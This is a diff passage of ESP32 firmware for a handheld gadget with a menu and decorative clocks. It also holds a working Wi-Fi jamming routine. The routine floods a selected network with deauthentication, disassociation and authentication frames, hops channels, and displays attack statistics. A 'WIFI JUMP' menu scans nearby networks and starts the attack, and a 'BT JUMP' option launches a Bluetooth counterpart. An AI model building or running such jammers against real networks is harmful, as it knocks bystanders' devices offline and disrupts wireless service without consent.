+    unsigned long lastStatUpdate = millis();
+    unsigned long packetsSent = 0;
+    unsigned long deauthSent = 0;
+    unsigned long disassocSent = 0;
+    unsigned long authSent = 0;
+    float pps = 0, maxPps = 0, avgPps = 0;
+    int attackMode = 0;
+    static float hexRotation = 0;
+    static int graphIndex = 0;
+    static float graphValues[220] = {0};
+    const String modeNames[3] = {"DEAUTH", "DISASSOC", "AUTH"};
+    const uint16_t modeColors[3] = {0x07E0, 0x001F, 0xF800};
+
+    while (isJamming)
+    {
+        // حمله چند مرحله‌ای
+        for (int i = 0; i < 128; i++)
+        {
+            switch (attackMode)
+            {
+            case 0: // Deauth
+                for (int j = 0; j < 3; j++)
+                {
+                    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+                    deauthSent++;
+                }
+                break;
+            case 1: // Disassoc
+                for (int j = 0; j < 3; j++)
+                {
+                    esp_wifi_80211_tx(WIFI_IF_AP, disassocPacket, sizeof(disassocPacket), false);
+                    disassocSent++;
+                }
+                break;
+            case 2: // Auth flood
+                for (int j = 0; j < 3; j++)
+                {
+                    esp_wifi_80211_tx(WIFI_IF_AP, authPacket, sizeof(authPacket), false);
+                    authSent++;
+                }
+                break;
+            }
+            packetsSent++;
+            delayMicroseconds(50);
+        }
+
+        // تغییر مود و کانال
+        if (millis() - lastChannelHop > 5000)
+        {
+            attackMode = (attackMode + 1) % 3;
+            channel = random(1, 14);
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            lastChannelHop = millis();
+        }
+
+        // بروزرسانی نمایشگر
+        if (millis() - lastStatUpdate > 100)
+        {
+            float duration = (millis() - startTime) / 1000.0;
+            pps = packetsSent / duration;
+            maxPps = max(maxPps, pps);
+            avgPps = (avgPps * 0.9) + (pps * 0.1);
+            hexRotation += 0.1;
+
+            tft.fillScreen(TFT_BLACK);
+
+            // کادر هگزاگونال متحرک
+            for (int i = 0; i < 6; i++)
+            {
+                float angle1 = i * PI / 3 + hexRotation;
+                float angle2 = (i + 1) * PI / 3 + hexRotation;
+                for (int r = 100; r < 120; r += 5)
+                {
+                    int x1 = 120 + r * cos(angle1);
+                    int y1 = 120 + r * sin(angle1);
+                    int x2 = 120 + r * cos(angle2);
+                    int y2 = 120 + r * sin(angle2);
+                    tft.drawLine(x1, y1, x2, y2, 0x07E0 - ((r - 100) * 0x0100));
+                }
+            }
+
+            // هدر
+            tft.setTextColor(0x07E0);
+            tft.setTextSize(2);
+            tft.setCursor(50, 8);
+            tft.print("CYBER ATTACK v5");
+
+            // اطلاعات هدف
+            tft.setTextSize(1);
+            tft.setCursor(10, 35);
+            tft.setTextColor(0x07FF);
+            for (int i = 0; i < targetSSID.length(); i++)
+            {
+                if (random(100) < 5)
+                {
+                    tft.print(char(random(33, 126)));
+                    delay(5);
+                    tft.setCursor(10 + i * 6, 35);
+                }
+                tft.print(targetSSID[i]);
+            }
+
+            // آمار حمله
+            tft.setCursor(10, 50);
+            tft.printf("MODE: %s", modeNames[attackMode].c_str());
+            tft.setCursor(10, 65);
+            tft.printf("CH: %d | RSSI: %d dBm", channel, targetRSSI);
+            tft.setCursor(10, 80);
+            tft.printf("PPS: %.1f | AVG: %.1f", pps, avgPps);
+            tft.setCursor(10, 95);
+            tft.printf("TOTAL: %lu | TIME: %.1fs", packetsSent, duration);
+
+            // نمودار عملکرد
+            graphValues[graphIndex] = pps;
+            graphIndex = (graphIndex + 1) % 220;
+
+            for (int i = 0; i < 219; i++)
+            {
+                int idx = (graphIndex + i) % 220;
+                int nextIdx = (graphIndex + i + 1) % 220;
+                int y1 = 170 - (graphValues[idx] * 40 / maxPps);
+                int y2 = 170 - (graphValues[nextIdx] * 40 / maxPps);
+                uint16_t color = 0x07E0 - ((i * 0x0300) / 220);
+                tft.drawLine(10 + i, y1, 10 + i + 1, y2, color);
+            }
+
+            // نمودار دایره‌ای توزیع پکت‌ها
+            const int pieX = 120;
+            const int pieY = 190;
+            const int pieR = 30;
+            float total = deauthSent + disassocSent + authSent;
+            float startAngle = 0;
+
+            unsigned long packets[3] = {deauthSent, disassocSent, authSent};
+
+            for (int i = 0; i < 3; i++)
+            {
+                float portion = packets[i] / total;
+                float endAngle = startAngle + portion * 2 * PI;
+
+                for (int r = pieR - 5; r <= pieR; r++)
+                {
+                    for (float angle = startAngle; angle < endAngle; angle += 0.05)
+                    {
+                        int x = pieX + r * cos(angle);
+                        int y = pieY + r * sin(angle);
+                        tft.drawPixel(x, y, modeColors[i]);
+                    }
+                }
+
+                float midAngle = (startAngle + endAngle) / 2;
+                int textX = pieX + (pieR + 10) * cos(midAngle);
+                int textY = pieY + (pieR + 10) * sin(midAngle);
+                tft.setCursor(textX - 10, textY - 3);
+                tft.printf("%d%%", (int)(portion * 100));
+
+                startAngle = endAngle;
+            }
+
+            // شاخص کارایی
+            tft.setCursor(10, 225);
+            tft.setTextColor(modeColors[attackMode]);
+            tft.printf("Attack Power: %d%%", (int)(avgPps / maxPps * 100));
+
+            // پالس حمله
+            static float pulseAngle = 0;
+            pulseAngle += 0.2;
+            for (int i = 0; i < 5; i++)
+            {
+                int radius = 15 + sin(pulseAngle) * 5;
+                tft.drawCircle(200, 200, radius + i, modeColors[attackMode] - (i * 0x0300));
+            }
+
+            lastStatUpdate = millis();
+        }
+
+        if (digitalRead(BUTTON_SELECT) == LOW)
+        {
+            delay(50);
+            if (digitalRead(BUTTON_SELECT) == LOW)
+                break;
+        }
+    }
+
+    // پاکسازی
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    WiFi.mode(WIFI_STA);
+
+    // انیمیشن پایان
+    for (int y = 239; y >= 0; y -= 4)
+    {
+        tft.drawFastHLine(0, y, 240, TFT_BLACK);
+        if (random(100) < 30)
+        {
+            tft.setTextColor(0x07E0);
+            tft.setCursor(random(240), y);
+            tft.print(char(random(33, 126)));
+        }
+        delay(2);
+    }
+
+    tft.fillScreen(TFT_BLACK);
+    tft.setTextColor(0x07E0);
+    tft.setTextSize(2);
+    tft.setCursor(30, 100);
+    tft.print("ATTACK COMPLETE");
+    tft.setTextSize(1);
+    tft.setCursor(30, 130);
+    tft.printf("TOTAL: %lu | PPS: %.1f", packetsSent, pps);
+    tft.setCursor(30, 145);
+    tft.printf("POWER: %d%%", (int)(avgPps / maxPps * 100));
+    delay(2000);
+}
+
+void drawMenuItem(int index, bool selected, String menuItem, int totalItems)
+{
+    int yPos = 45 + (index * 35); // Increased spacing between items
+    int xPos = 10;
+    int width = 220;
+    int height = 30; // Increased height of each item
+
+    if (selected)
+    {
+        tft.fillRoundRect(xPos, yPos, width, height, 5, SELECTED_BG);
+
+        // Cyber corners
+        int cornerSize = 8;
+        tft.drawLine(xPos, yPos, xPos + cornerSize, yPos, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos, yPos, xPos, yPos + cornerSize, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos + width - cornerSize, yPos, xPos + width, yPos, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos + width, yPos, xPos + width, yPos + cornerSize, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos, yPos + height, xPos + cornerSize, yPos + height, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos, yPos + height - cornerSize, xPos, yPos + height, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos + width - cornerSize, yPos + height, xPos + width, yPos + height, HIGHLIGHT_COLOR);
+        tft.drawLine(xPos + width, yPos + height - cornerSize, xPos + width, yPos + height, HIGHLIGHT_COLOR);
+
+        static int scanPos = 0;
+        tft.drawFastVLine(xPos + scanPos, yPos + 2, height - 4, HIGHLIGHT_COLOR);
+        scanPos = (scanPos + 4) % width;
+    }
+    else
+    {
+        tft.fillRoundRect(xPos, yPos, width, height, 5, MENU_BG);
+        tft.drawRoundRect(xPos, yPos, width, height, 5, MATRIX_COLOR);
+    }
+
+    tft.setTextSize(2); // Increased text size
+    tft.setTextColor(selected ? HIGHLIGHT_COLOR : MENU_FG);
+    tft.setCursor(xPos + 15, yPos + 8);
+    tft.print(menuItem);
+}
+
+void drawSystemInfo(String menuTitle)
+{
+    tft.fillRect(0, 0, 240, 50, SELECTED_BG);
+
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setTextSize(1);
+
+    tft.setCursor(5, 5);
+    tft.print("SYSTEM: ACTIVE | USER: ");
+    tft.setTextColor(MENU_FG);
+    tft.print("nimaprogramer2");
+
+    tft.setCursor(5, 20);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.print("UTC: ");
+    tft.setTextColor(MENU_FG);
+    tft.print("2025-05-26 23:52:14");
+
+    struct tm timeinfo;
+    if (getLocalTime(&timeinfo))
+    {
+        int jYear, jMonth, jDay;
+        gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                          &jYear, &jMonth, &jDay);
+
+        tft.setCursor(5, 35);
+        tft.setTextColor(HIGHLIGHT_COLOR);
+        tft.print("LOCAL: ");
+        tft.setTextColor(MENU_FG);
+        tft.printf("%d/%02d/%02d | %02d:%02d:%02d",
+                   jYear, jMonth, jDay,
+                   timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
+    }
+}
+
+void handleJumpersSelection()
+{
+    switch (currentJumpersSelection)
+    {
+    case 0: // WIFI JUMP
+        WiFi.disconnect(true);
+        WiFi.mode(WIFI_STA);
+        delay(100);
+        scanNetworks();
+        while (true)
+        {
+            if (showNetworks)
+            {
+                displayNetworks();
+            }
+
+            if (digitalRead(BUTTON_UP) == LOW)
+            {
+                delay(200);
+                if (selectedNetwork > 0)
+                {
+                    selectedNetwork--;
+                    displayNetworks();
+                }
+            }
+
+            if (digitalRead(BUTTON_DOWN) == LOW)
+            {
+                delay(200);
+                if (selectedNetwork < numNetworks - 1)
+                {
+                    selectedNetwork++;
+                    displayNetworks();
+                }
+            }
+
+            if (digitalRead(BUTTON_SELECT) == LOW)
+            {
+                delay(200);
+                if (!isJamming && numNetworks > 0)
+                {
+                    isJamming = true;
+                    showNetworks = false;
+                    startJamming(networks[selectedNetwork].primary);
+                }
+                else
+                {
+                    isJamming = false;
+                    showNetworks = true;
+                    esp_wifi_set_promiscuous(false);
+                    WiFi.mode(WIFI_STA);
+                    delay(100);
+                    scanNetworks();
+                }
+            }
+
+            // برگشت به منو با نگه داشتن دکمه
+            if (digitalRead(BUTTON_SELECT) == LOW && !isJamming)
+            {
+                delay(1000);
+                if (digitalRead(BUTTON_SELECT) == LOW)
+                {
+                    WiFi.mode(WIFI_STA);
+                    WiFi.begin(ssid, password);
+                    currentMenu = JUMPERS_MENU;
+                    needRedraw = true;
+                    break;
+                }
+            }
+            delay(50);
+        }
+        break;
+
+    case 1: // BT JUMP
+        Serial.println("Starting BT Jump...");
+        // پاک کردن صفحه و نمایش پیام شروع
+        tft.fillScreen(TFT_BLACK);
+        tft.setTextColor(0x07E0);
+        tft.setTextSize(2);
+        tft.setCursor(30, 100);
+        tft.print("STARTING BT...");
+        delay(500);
+        startBTJump();
+        break;
+
+    case 2: // BACK
+        currentMenu = MAIN_MENU;
+        needRedraw = true;
+        break;
+    }
+}
+
+void updateTimeFromNTP()
+{
+    struct tm timeinfo;
+    configTime(gmtOffset_sec, daylightOffset_sec, ntpServer);
+    if (getLocalTime(&timeinfo))
+    {
+        char timeStringBuff[30];
+        int jYear, jMonth, jDay;
+        gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                          &jYear, &jMonth, &jDay);
+        sprintf(timeStringBuff, "%d/%02d/%02d %02d:%02d:%02d",
+                jYear, jMonth, jDay,
+                timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
+        currentDateTime = String(timeStringBuff);
+        timeInitialized = true;
+    }
+}
+
+void drawSevenSegment(int x, int y, int num, int size)
+{
+    const byte digits[10] = {
+        0b1111110, // 0
+        0b0110000, // 1
+        0b1101101, // 2
+        0b1111001, // 3
+        0b0110011, // 4
+        0b1011011, // 5
+        0b1011111, // 6
+        0b1110000, // 7
+        0b1111111, // 8
+        0b1111011  // 9
+    };
+
+    int segLen = size * 4;
+    int thickness = size;
+
+    byte segments = digits[num];
+
+    // Draw segments
+    if (segments & 0x40)
+        tft.fillRect(x + thickness, y, segLen, thickness, SEGMENT_ON);
+    if (segments & 0x20)
+        tft.fillRect(x + segLen + thickness, y + thickness, thickness, segLen, SEGMENT_ON);
+    if (segments & 0x10)
+        tft.fillRect(x + segLen + thickness, y + thickness * 2 + segLen, thickness, segLen, SEGMENT_ON);
+    if (segments & 0x08)
+        tft.fillRect(x + thickness, y + segLen * 2 + thickness * 2, segLen, thickness, SEGMENT_ON);
+    if (segments & 0x04)
+        tft.fillRect(x, y + thickness * 2 + segLen, thickness, segLen, SEGMENT_ON);
+    if (segments & 0x02)
+        tft.fillRect(x, y + thickness, thickness, segLen, SEGMENT_ON);
+    if (segments & 0x01)
+        tft.fillRect(x + thickness, y + segLen + thickness, segLen, thickness, SEGMENT_ON);
+}
+
+void drawHexBackground()
+{
+    tft.setTextSize(1);
+    tft.setTextColor(DIM_GREEN);
+
+    for (int i = 0; i < 240; i += 20)
+    {
+        for (int j = 0; j < 240; j += 20)
+        {
+            if ((random(100)) < 20)
+            {
+                tft.setCursor(i, j);
+                tft.printf("%02X", random(256));
+            }
+        }
+    }
+}
+
+void drawDigitalClock24()
+{
+    struct tm timeinfo;
+    if (!getLocalTime(&timeinfo))
+    {
+        return;
+    }
+
+    tft.fillScreen(MENU_BG);
+
+    // Draw background effect
+    for (int i = 0; i < 240; i += 40)
+    {
+        tft.drawRect(0, i, 240, 2, DIM_GREEN);
+    }
+
+    // Get time components
+    int hours = timeinfo.tm_hour;
+    int minutes = timeinfo.tm_min;
+    int seconds = timeinfo.tm_sec;
+
+    // Draw hours
+    drawSevenSegment(20, 60, hours / 10, 6);
+    drawSevenSegment(70, 60, hours % 10, 6);
+
+    // Draw colon
+    tft.fillRect(120, 80, 4, 4, SEGMENT_ON);
+    tft.fillRect(120, 100, 4, 4, SEGMENT_ON);
+
+    // Draw minutes
+    drawSevenSegment(140, 60, minutes / 10, 6);
+    drawSevenSegment(190, 60, minutes % 10, 6);
+
+    // Draw seconds bar
+    int barWidth = (seconds * 200) / 60;
+    tft.drawRect(20, 160, 200, 10, DIM_GREEN);
+    tft.fillRect(20, 160, barWidth, 10, SEGMENT_ON);
+
+    // Draw date with corrected day
+    int jYear, jMonth, jDay;
+    gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                      &jYear, &jMonth, &jDay);
+
+    tft.setTextSize(2);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(40, 190);
+    tft.printf("%d/%02d/%02d", jYear, jMonth, jDay);
+}
+
+void initMatrixRain()
+{
+    for (int i = 0; i < MAX_DROPS; i++)
+    {
+        matrixDrops[i].x = random(240);
+        matrixDrops[i].y = random(-50, 0);
+        matrixDrops[i].speed = random(2, 5);
+        matrixDrops[i].character = random(33, 126);
+        matrixDrops[i].active = true;
+    }
+}
+
+void updateMatrixRain()
+{
+    for (int i = 0; i < MAX_DROPS; i++)
+    {
+        if (matrixDrops[i].active)
+        {
+            // Clear previous character
+            tft.setTextColor(TFT_BLACK);
+            tft.drawChar(matrixDrops[i].x, matrixDrops[i].y, matrixDrops[i].character, 2);
+
+            // Update position
+            matrixDrops[i].y += matrixDrops[i].speed;
+
+            // Draw new character
+            tft.setTextColor(MATRIX_COLOR);
+            matrixDrops[i].character = random(33, 126);
+            tft.drawChar(matrixDrops[i].x, matrixDrops[i].y, matrixDrops[i].character, 2);
+
+            // Reset if off screen
+            if (matrixDrops[i].y > 240)
+            {
+                matrixDrops[i].y = random(-50, 0);
+                matrixDrops[i].x = random(240);
+                matrixDrops[i].speed = random(2, 5);
+            }
+        }
+    }
+}
+
+void drawMatrixClock()
+{
+    static bool initialized = false;
+    if (!initialized)
+    {
+        initMatrixRain();
+        initialized = true;
+    }
+
+    struct tm timeinfo;
+    if (!getLocalTime(&timeinfo))
+    {
+        return;
+    }
+
+    // Update matrix rain effect
+    updateMatrixRain();
+
+    // Draw time with glowing effect
+    char timeStr[9];
+    strftime(timeStr, sizeof(timeStr), "%H:%M:%S", &timeinfo);
+
+    tft.setTextSize(3);
+    // Shadow effect
+    tft.setTextColor(DIM_GREEN);
+    tft.setCursor(42, 102);
+    tft.print(timeStr);
+
+    // Main text
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(40, 100);
+    tft.print(timeStr);
+
+    // Draw date with corrected day
+    int jYear, jMonth, jDay;
+    gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                      &jYear, &jMonth, &jDay);
+
+    tft.setTextSize(2);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(50, 150);
+    tft.printf("%d/%02d/%02d", jYear, jMonth, jDay);
+}
+
+void drawModernClock()
+{
+    struct tm timeinfo;
+    if (!getLocalTime(&timeinfo))
+    {
+        return;
+    }
+
+    tft.fillScreen(MENU_BG);
+    drawSystemInfo("MODERN CLOCK");
+
+    // Draw modern grid background
+    for (int i = 0; i < 240; i += 20)
+    {
+        tft.drawLine(0, i, 240, i, DIM_GREEN);
+        tft.drawLine(i, 0, i, 240, DIM_GREEN);
+    }
+
+    // Draw time digits with shadow effect
+    char timeStr[9];
+    sprintf(timeStr, "%02d:%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
+
+    // Shadow
+    tft.setTextSize(4);
+    tft.setTextColor(DIM_GREEN);
+    tft.setCursor(32, 92);
+    tft.print(timeStr);
+
+    // Main text
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(30, 90);
+    tft.print(timeStr);
+
+    // Draw scanning line
+    static int scanLine = 0;
+    tft.drawFastHLine(0, scanLine, 240, DIM_GREEN);
+    scanLine = (scanLine + 1) % 240;
+
+    // Draw date with corrected day
+    int jYear, jMonth, jDay;
+    gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                      &jYear, &jMonth, &jDay);
+
+    // Draw date frame
+    tft.drawRect(40, 180, 160, 30, MATRIX_COLOR);
+    tft.drawRect(41, 181, 158, 28, DIM_GREEN);
+
+    tft.setTextSize(2);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(50, 188);
+    tft.printf("%d/%02d/%02d", jYear, jMonth, jDay);
+}
+
+void drawAnalogClock()
+{
+    struct tm timeinfo;
+    if (!getLocalTime(&timeinfo))
+    {
+        return;
+    }
+
+    tft.fillScreen(MENU_BG);
+
+    int centerX = 120;
+    int centerY = 120;
+    int radius = 110;
+
+    // Draw hex grid background
+    for (int i = 0; i < 240; i += 40)
+    {
+        for (int j = 0; j < 240; j += 40)
+        {
+            if (random(100) < 30)
+            {
+                for (int k = 0; k < 6; k++)
+                {
+                    float angle1 = k * PI / 3;
+                    float angle2 = (k + 1) * PI / 3;
+                    int x1 = i + 15 * cos(angle1);
+                    int y1 = j + 15 * sin(angle1);
+                    int x2 = i + 15 * cos(angle2);
+                    int y2 = j + 15 * sin(angle2);
+                    tft.drawLine(x1, y1, x2, y2, DIM_GREEN);
+                }
+            }
+        }
+    }
+
+    // Draw multiple decorative rings with cyber effect
+    for (int i = 0; i < 5; i++)
+    {
+        tft.drawCircle(centerX, centerY, radius - i * 5, HIGHLIGHT_COLOR - (i * 0x0200));
+    }
+
+    // Draw glowing triangles at cardinal points
+    for (int i = 0; i < 4; i++)
+    {
+        float angle = i * PI / 2;
+        int x1 = centerX + (radius + 5) * cos(angle);
+        int y1 = centerY + (radius + 5) * sin(angle);
+        int x2 = centerX + (radius - 10) * cos(angle - 0.2);
+        int y2 = centerY + (radius - 10) * sin(angle - 0.2);
+        int x3 = centerX + (radius - 10) * cos(angle + 0.2);
+        int y3 = centerY + (radius - 10) * sin(angle + 0.2);
+
+        tft.fillTriangle(x1, y1, x2, y2, x3, y3, HIGHLIGHT_COLOR);
+        tft.drawTriangle(x1, y1, x2, y2, x3, y3, MATRIX_COLOR);
+    }
+
+    // Draw hour markers with cyber effect
+    for (int h = 0; h < 12; h++)
+    {
+        float angle = h * 30 * PI / 180;
+        int x1 = centerX + (radius - 15) * cos(angle);
+        int y1 = centerY + (radius - 15) * sin(angle);
+        int x2 = centerX + radius * cos(angle);
+        int y2 = centerY + radius * sin(angle);
+
+        // Marker lines with gradient
+        for (int i = 0; i < 3; i++)
+        {
+            tft.drawLine(x1 + i, y1, x2 + i, y2, HIGHLIGHT_COLOR - (i * 0x0200));
+        }
+
+        // Hour numbers with hex frame
+        int numX = centerX + (radius - 35) * cos(angle) - 6;
+        int numY = centerY + (radius - 35) * sin(angle) - 6;
+
+        // Draw hex frame around numbers
+        for (int k = 0; k < 6; k++)
+        {
+            float hexAngle1 = k * PI / 3 + angle;
+            float hexAngle2 = (k + 1) * PI / 3 + angle;
+            int hx1 = numX + 12 * cos(hexAngle1);
+            int hy1 = numY + 12 * sin(hexAngle1);
+            int hx2 = numX + 12 * cos(hexAngle2);
+            int hy2 = numY + 12 * sin(hexAngle2);
+            tft.drawLine(hx1, hy1, hx2, hy2, DIM_GREEN);
+        }
+
+        tft.setTextSize(2);
+        tft.setTextColor(HIGHLIGHT_COLOR);
+        tft.setCursor(numX, numY);
+        tft.print(h == 0 ? 12 : h);
+    }
+
+    // Calculate hand angles with smooth movement
+    float secondAngle = timeinfo.tm_sec * 6 * PI / 180;
+    float minuteAngle = (timeinfo.tm_min * 6 + timeinfo.tm_sec * 0.1) * PI / 180;
+    float hourAngle = (timeinfo.tm_hour * 30 + timeinfo.tm_min * 0.5) * PI / 180;
+
+    // Draw hands with cyber effect
+    // Hour hand (triangular)
+    for (int i = 0; i < 3; i++)
+    {
+        int handLength = 60 - i * 5;
+        int handWidth = 8 - i * 2;
+
+        int tipX = centerX + handLength * cos(hourAngle);
+        int tipY = centerY + handLength * sin(hourAngle);
+        int leftX = centerX + handWidth * cos(hourAngle + PI / 2);
+        int leftY = centerY + handWidth * sin(hourAngle + PI / 2);
+        int rightX = centerX + handWidth * cos(hourAngle - PI / 2);
+        int rightY = centerY + handWidth * sin(hourAngle - PI / 2);
+
+        tft.fillTriangle(tipX, tipY, leftX, leftY, rightX, rightY, HIGHLIGHT_COLOR - (i * 0x0200));
+    }
+
+    // Minute hand (double line with glow)
+    for (int i = 0; i < 3; i++)
+    {
+        int minX1 = centerX + (90 - i) * cos(minuteAngle - 0.03);
+        int minY1 = centerY + (90 - i) * sin(minuteAngle - 0.03);
+        int minX2 = centerX + (90 - i) * cos(minuteAngle + 0.03);
+        int minY2 = centerY + (90 - i) * sin(minuteAngle + 0.03);
+        tft.drawLine(centerX, centerY, minX1, minY1, HIGHLIGHT_COLOR - (i * 0x0200));
+        tft.drawLine(centerX, centerY, minX2, minY2, HIGHLIGHT_COLOR - (i * 0x0200));
+    }
+
+    // Second hand with particle trail
+    for (int i = 0; i < 5; i++)
+    {
+        float trailAngle = secondAngle - (i * 0.1);
+        int trailX = centerX + (100 - i * 5) * cos(trailAngle);
+        int trailY = centerY + (100 - i * 5) * sin(trailAngle);
+        tft.drawLine(centerX, centerY, trailX, trailY, HIGHLIGHT_COLOR - (i * 0x0300));
+
+        // Particles
+        if (i < 3)
+        {
+            int particleSize = 3 - i;
+            tft.fillCircle(trailX, trailY, particleSize, HIGHLIGHT_COLOR - (i * 0x0400));
+        }
+    }
+
+    // Center decoration with rotating elements
+    static float rotationAngle = 0;
+    rotationAngle += 0.2;
+
+    for (int i = 0; i < 4; i++)
+    {
+        float dekAngle = rotationAngle + (i * PI / 2);
+        int dekX = centerX + 12 * cos(dekAngle);
+        int dekY = centerY + 12 * sin(dekAngle);
+        tft.drawLine(centerX, centerY, dekX, dekY, MATRIX_COLOR);
+    }
+
+    tft.fillCircle(centerX, centerY, 6, HIGHLIGHT_COLOR);
+    tft.drawCircle(centerX, centerY, 7, MATRIX_COLOR);
+    tft.drawCircle(centerX, centerY, 8, DIM_GREEN);
+
+    // Draw digital time in hex frame at bottom
+    char timeStr[9];
+    sprintf(timeStr, "%02d:%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
+
+    // Draw hex frame for time
+    int timeX = 70;
+    int timeY = 210;
+    int timeWidth = 100;
+    int timeHeight = 25;
+
+    // Draw hex corners
+    for (int i = 0; i < 4; i++)
+    {
+        int x = (i % 2) ? timeX + timeWidth : timeX;
+        int y = (i / 2) ? timeY + timeHeight : timeY;
+        tft.drawLine(x, y, x + ((i % 2) ? -10 : 10), y, MATRIX_COLOR);
+        tft.drawLine(x, y, x, y + ((i / 2) ? -10 : 10), MATRIX_COLOR);
+    }
+
+    tft.drawRect(timeX, timeY, timeWidth, timeHeight, HIGHLIGHT_COLOR);
+    tft.setTextSize(2);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(timeX + 10, timeY + 5);
+    tft.print(timeStr);
+}
+
+void drawSkull(int centerX, int centerY, int size, uint16_t color)
+{
+    // Draw skull base (more detailed)
+    tft.fillRoundRect(centerX - size / 2, centerY - size / 2, size, size * 0.8, size / 4, color);
+
+    // Draw jaw
+    tft.fillRoundRect(centerX - size / 3, centerY + size / 8, size * 2 / 3, size / 3, size / 8, color);
+
+    // Eyes (larger and more angular)
+    int eyeSize = size / 3;
+    int eyeY = centerY - size / 6;
+    static bool eyeBlink = false;
+
+    // Left eye socket
+    tft.fillTriangle(
+        centerX - size / 3, eyeY - eyeSize / 2,
+        centerX - size / 6, eyeY - eyeSize / 2,
+        centerX - size / 4, eyeY + eyeSize / 2,
+        TFT_BLACK);
+
+    // Right eye socket
+    tft.fillTriangle(
+        centerX + size / 3, eyeY - eyeSize / 2,
+        centerX + size / 6, eyeY - eyeSize / 2,
+        centerX + size / 4, eyeY + eyeSize / 2,
+        TFT_BLACK);
+
+    // Nose cavity
+    tft.fillTriangle(
+        centerX, centerY,
+        centerX - size / 6, centerY + size / 6,
+        centerX + size / 6, centerY + size / 6,
+        TFT_BLACK);
+
+    // Teeth
+    int toothWidth = size / 10;
+    int toothHeight = size / 8;
+    int teethY = centerY + size / 4;
+    for (int i = 0; i < 6; i++)
+    {
+        tft.fillRect(centerX - size / 3 + i * toothWidth, teethY,
+                     toothWidth - 2, toothHeight, TFT_BLACK);
+    }
+
+    // Cranium details
+    tft.drawLine(centerX - size / 3, centerY - size / 3,
+                 centerX + size / 3, centerY - size / 3, TFT_BLACK);
+    tft.drawLine(centerX, centerY - size / 2,
+                 centerX, centerY - size / 6, TFT_BLACK);
+}
+
+void drawSkullClock()
+{
+    struct tm timeinfo;
+    if (!getLocalTime(&timeinfo))
+    {
+        return;
+    }
+
+    tft.fillScreen(MENU_BG);
+
+    // Draw cyber grid background
+    for (int i = 0; i < 240; i += 40)
+    {
+        tft.drawLine(0, i, 240, i, DIM_GREEN);
+        tft.drawLine(i, 0, i, 240, DIM_GREEN);
+    }
+
+    // Draw skull
+    drawSkull(120, 90, 80, MATRIX_COLOR);
+
+    // Draw time with glitch effect
+    char timeStr[9];
+    sprintf(timeStr, "%02d:%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
+
+    tft.setTextSize(3);
+    // Shadow effect
+    tft.setTextColor(DIM_GREEN);
+    tft.setCursor(42, 162);
+    tft.print(timeStr);
+
+    // Main text
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(40, 160);
+    tft.print(timeStr);
+
+    // Random glitch on text
+    if (random(10) == 0)
+    {
+        int glitchPos = random(8);
+        tft.setCursor(40 + glitchPos * 18, 160);
+        tft.print(char(random(33, 126)));
+    }
+
+    // Draw date with corrected day
+    int jYear, jMonth, jDay;
+    gregorianToJalali(timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday + 1,
+                      &jYear, &jMonth, &jDay);
+
+    tft.setTextSize(2);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setCursor(70, 200);
+    tft.printf("%d/%02d/%02d", jYear, jMonth, jDay);
+
+    // Add random glitch lines
+    if (random(5) == 0)
+    {
+        int glitchY = random(240);
+        int glitchWidth = random(20, 100);
+        tft.drawFastHLine(random(240 - glitchWidth), glitchY, glitchWidth, HIGHLIGHT_COLOR);
+    }
+}
+
+void drawMainMenu()
+{
+    if (!needRedraw)
+        return;
+    tft.fillScreen(MENU_BG);
+    drawHexBackground();
+
+    for (int i = 0; i < MAIN_MENU_ITEMS; i++)
+    {
+        drawMenuItem(i, i == currentMainSelection, mainMenuItems[i], MAIN_MENU_ITEMS);
+    }
+    needRedraw = false;
+}
+
+void drawClockMenu()
+{
+    if (!needRedraw)
+        return;
+    tft.fillScreen(MENU_BG);
+    drawHexBackground();
+
+    for (int i = 0; i < CLOCK_MENU_ITEMS; i++)
+    {
+        drawMenuItem(i, i == currentClockSelection, clockMenuItems[i], CLOCK_MENU_ITEMS);
+    }
+    needRedraw = false;
+}
+
+bool tft_output(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t *bitmap)
+{
+    if (x + w > DISPLAY_WIDTH)
+        w = DISPLAY_WIDTH - x;
+    if (y + h > DISPLAY_HEIGHT)
+        h = DISPLAY_HEIGHT - y;
+    if (w <= 0 || h <= 0)
+        return false;
+
+    tft.pushImage(x, y, w, h, bitmap);
+    return true;
+}
+
+void handleMainSelection()
+{
+    if (currentMainSelection == 0)
+    {
+        currentMenu = CLOCK_MENU;
+        needRedraw = true;
+    }
+    else if (currentMainSelection == 1)
+    {
